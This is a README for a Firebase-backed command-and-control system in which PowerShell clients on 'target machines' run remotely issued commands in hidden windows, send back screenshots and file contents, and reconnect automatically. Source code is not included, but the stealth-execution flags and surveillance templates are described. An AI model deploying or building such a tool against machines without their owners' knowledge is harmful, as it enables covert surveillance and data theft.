# Firebase Remote Command & Control System

A Python-based remote command execution system using Firebase Realtime Database for command distribution and response collection. Features include multi-client management, unique client identification, automatic dead client cleanup, and a Rich-based admin panel.

## Features

- 🔥 Real-time Firebase RTDB for command distribution
- 🖥️ Multi-client support with unique ID tracking
- 🎛️ Interactive admin panel with Rich UI
- 🔐 SHA256-based client identification
- 📸 Automatic Base64 image detection and saving
- 🧹 Automatic dead client detection and removal
- 🔄 Network resilience with auto-reconnection
- 👻 Stealth command execution (hidden PowerShell processes)
- 📋 Command template system with 10+ pre-built templates

## Architecture

```
Firebase RTDB
      ↕
server_v3.py (Flask + SocketIO + Firebase)
      ↕ (TCP:8081 & HTTP:5005)
client_v3.ps1 (PowerShell clients with unique IDs)
      ↕
admin_panel.py (Rich CLI admin interface)
```

## Prerequisites

- Python 3.7+
- PowerShell 5.1+ (Windows)
- Firebase project with Realtime Database
- Firebase service account key JSON file

## Installation

### 1. Install Python Dependencies

```bash
pip install -r requirements.txt
pip install -r admin_requirements.txt
```

### 2. Configure Environment

Create a `.env` file in the project root:

```env
FIREBASE_DATABASE_URL=https://your-project-default-rtdb.firebaseio.com
FIREBASE_SERVICE_ACCOUNT_KEY_PATH=./serviceAccountKey.json
FLASK_HOST=127.0.0.1
PORT=5005
```

### 3. Add Firebase Service Account Key

- Download `serviceAccountKey.json` from Firebase Console
- Place it in the project root directory

## Usage

### 1. Start the Server

```bash
python server_v3.py
```

Server components:
- Flask HTTP server: `http://127.0.0.1:5005`
- TCP socket server: `127.0.0.1:8081`
- Firebase RTDB listeners for each client

### 2. Connect Clients

On each target machine, run:

```powershell
.\client_v3.ps1
```

The client will:
- Connect to server on TCP port 8081
- Register with server and receive a unique client ID (16-char hash)
- Monitor network connectivity (auto-reconnect)
- Listen for commands from Firebase
- Execute commands in stealth mode (hidden PowerShell process)

### 3. Launch Admin Panel

```bash
python admin_panel.py
```

Admin panel features:
- View all connected clients
- Automatic dead client cleanup (4 seconds)
- Direct command-line interface to any client
- 10-second timeout for command responses
- Automatic Base64 image detection and saving
- Command template management

## Database Structure

```
Firebase RTDB Root
├── {client_id_1}
│   ├── pc_name: "DESKTOP-ABC123"
│   ├── status: "connected"
│   ├── last_seen: "2025-12-01T15:30:45"
│   ├── address: "192.168.1.100:54321"
│   └── exe
│       ├── command: "whoami"
│       └── output: "domain\\username"
├── {client_id_2}
│   └── ...
```

Client ID generation:
```python
SHA256(f"{pc_name}_{ip}_{port}_{timestamp}")[:16]
```

## Admin Panel Usage

### Main Menu

```
╭─ 🖥️  Connected Clients ─╮
│ Index │ PC Name         │ Client ID        │ Status    │
│ 1     │ DESKTOP-ABC123  │ 155aca2f2f2f0016 │ connected │
│ 2     │ LAPTOP-XYZ789   │ e28deea34af68ba5 │ connected │
╰────────────────────────────────────────────────────────╯

Options:
  <number> - Select client by index
  r - Refresh client list
  t - Manage command templates
  q - Quit
```

### Command Shell

After selecting a client:

```
╭─ 🎛️  Command Shell ─╮
│ Connected to: DESKTOP-ABC123        │
│ Client ID: 155aca2f2f2f0016         │
╰────────────────────────────────────╯

DESKTOP-ABC123 $ whoami
✓ Command sent to client
Waiting for response...
domain\username

DESKTOP-ABC123 $ pwd
✓ Command sent to client
Waiting for response...
C:\Users\Username

DESKTOP-ABC123 $ back      # Return to main menu
DESKTOP-ABC123 $ exit      # Quit admin panel
```

### Base64 Image Handling

When a command outputs Base64 image data (e.g., screenshots), the admin panel:
1. Detects the Base64 format automatically
2. Decodes the image
3. Saves to `screenshots/` folder
4. Shows success message with filename

Example:
```
DESKTOP-ABC123 $ [screenshot command]
✓ Command sent to client
Waiting for response...
✓ Image saved: screenshots/155aca2f_20251201_153045.png
```

## Command Templates

Pre-built templates (stored in `command_templates.json`):

1. **Take Screenshot** - Captures screen and outputs Base64
2. **Copy Image as Base64** - Convert image file to Base64
3. **List Directory** - Get directory contents
4. **Get System Info** - Computer information
5. **Get Running Processes** - Top 10 CPU-consuming processes
6. **Get Network Adapters** - Network interface details
7. **Read File Content** - Read any file
8. **Get Disk Usage** - Drive space information
9. **Get Current User** - User details
10. **Get Installed Software** - List installed programs

Templates support arguments using `<placeholder>` syntax:
```json
{
  "title": "Read File Content",
  "command": "Get-Content \"<file path>\" -Raw"
}
```

## Client Features

### Network Resilience
- Monitors connectivity via ping to 8.8.8.8
- Automatic reconnection with retry logic (up to 100 attempts)
- 5-second delay between retry attempts
- Double-check before declaring network down (500ms apart)

### Stealth Execution
Commands execute in a hidden PowerShell process:
```powershell
-NoProfile -WindowStyle Hidden -CreateNoWindow
```

### Client Identification
Each client stores its ID locally after registration:
```powershell
$script:clientId = "155aca2f2f2f0016"
```

## Server Features

### Per-Client Threading
- Dedicated thread for each TCP client connection
- Individual Firebase listeners per client
- Pending socket queue for registration sync

### Dead Client Cleanup
Admin panel automatically removes inactive clients:
1. Sends `whoami` command to all clients
2. Waits 2 seconds
3. Sends `pwd` command to all clients
4. Waits 2 seconds
5. Removes clients with unchanged output (no response)

Total cleanup time: ~4 seconds

## API Endpoints

### Server (server_v3.py)

- `POST /register` - Register new client, returns client_id
- `POST /upstream` - Receive command output from clients
  ```json
  {
    "client_id": "155aca2f2f2f0016",
    "output": "command result"
  }
  ```

### TCP Communication

- **Port 8081** - Broadcast server for command distribution
- Sends: `Connected to Firebase RTDB Command Server` on connection

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `FIREBASE_DATABASE_URL` | Firebase RTDB URL | Required |
| `FIREBASE_SERVICE_ACCOUNT_KEY_PATH` | Service account key path | `./serviceAccountKey.json` |
| `FLASK_HOST` | Flask server bind address | `127.0.0.1` |
| `PORT` | Flask HTTP server port | `5005` |

### Ports

- **5005** - Flask HTTP server (registration, output upload)
- **8081** - TCP broadcast server (command distribution)

## Security Considerations

⚠️ **WARNING: This system executes arbitrary remote commands**

Security measures:
- Use only in controlled, trusted environments
- Keep Firebase service account key secure
- Implement network firewall rules
- Consider VPN for remote access
- Monitor Firebase security rules
- Regular audit of connected clients

**NOT recommended for:**
- Production environments
- Untrusted networks
- Systems with sensitive data without additional security layers

## File Structure

```
.
├── server_v3.py              # Main server with per-client threading
├── client_v3.ps1             # PowerShell client with unique ID
├── admin_panel.py            # Rich CLI admin interface
├── command_templates.json    # Pre-built command templates
├── requirements.txt          # Server dependencies
├── admin_requirements.txt    # Admin panel dependencies
├── .env                      # Environment configuration
├── serviceAccountKey.json    # Firebase credentials
└── screenshots/              # Auto-generated for Base64 images
```

## Troubleshooting

### Client Connection Issues

**Network unavailable error:**
```powershell
Connection error: Network unavailable
```
- Check internet connectivity
- Verify firewall isn't blocking ping to 8.8.8.8
- Network check now requires 2 consecutive failures

**Client registration fails:**
- Ensure server is running on port 5005
- Check `FLASK_HOST` is accessible from client
- Verify no firewall blocking HTTP traffic

### Server Issues

**Firebase authentication fails:**
- Verify `serviceAccountKey.json` path in `.env`
- Check Firebase Database URL is correct
- Ensure service account has RTDB read/write permissions

**Port already in use:**
```bash
OSError: [Errno 98] Address already in use
```
- Kill process using port 5005 or 8081
- Change ports in `.env` and client script

### Admin Panel Issues

**No clients found:**
- Verify clients are connected (check server console)
- Run cleanup manually (wait 4 seconds)
- Check Firebase RTDB for client entries

**Image not saving:**
- Verify output is valid Base64
- Check `screenshots/` folder permissions
- Ensure Base64 string is complete (not truncated)

## Development

### Adding New Command Templates

Edit `command_templates.json`:
```json
{
  "title": "Your Command",
  "command": "Your-PowerShell-Command \"<argument>\""
}
```

Or use admin panel: `t` → `2` (Add new template)

### Modifying Client Behavior

Key functions in `client_v3.ps1`:
- `Test-NetworkConnection` - Network monitoring
- Command execution loop (line ~114)
- Registration logic (line ~83)

### Extending Server

Key components in `server_v3.py`:
- `generate_client_id()` - Client ID generation
- `handle_client_connection()` - Per-client thread
- Firebase listeners - Real-time command monitoring

## License

MIT License - Use at your own risk

## Contributing

This is a personal project for controlled environment use. Security-focused contributions welcome.
